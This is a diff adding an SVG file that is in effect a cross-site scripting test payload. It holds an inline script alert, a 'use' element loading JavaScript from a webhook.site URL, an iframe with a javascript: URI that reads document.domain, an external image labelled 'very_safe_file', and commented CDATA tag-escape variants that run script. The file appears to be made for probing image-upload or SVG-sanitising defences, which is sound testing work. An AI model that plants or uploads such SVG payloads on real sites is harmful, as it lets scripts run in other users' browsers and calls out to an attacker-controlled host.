@@ -1,0 +1,12 @@
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 200 200">
+  <!-- <image href="https://webhook.site/1ff04dbe-e5da-4af3-ae7f-9368d0ae4089/file.js" x="10" y="10" width="100" height="100" /> -->
+   <use xlink:href="https://webhook.site/1ff04dbe-e5da-4af3-ae7f-9368d0ae4089/file.js"/>
+   <script type="text/javascript">alert('sub-svg 1');</script>
+ <image xlink:href="https://res.cloudinary.com/dobg1vyas/image/upload/v1749733676/very_safe_file_o2a4c0.svg" height="200" width="200"/>
+  <foreignObject width="500" height="500">
+                <iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:confirm(document.domain);" width="400" height="250"/>
+        </foreignObject>
+<!-- <title><![CDATA[</title><script>alert(3)</script>]]> -->
+<!-- <foreignObject><![CDATA[</foreignObject><script>alert(2)</script>]]> -->
+<!-- <desc><![CDATA[</desc><script>alert(1)</script>]]> -->
+</svg>
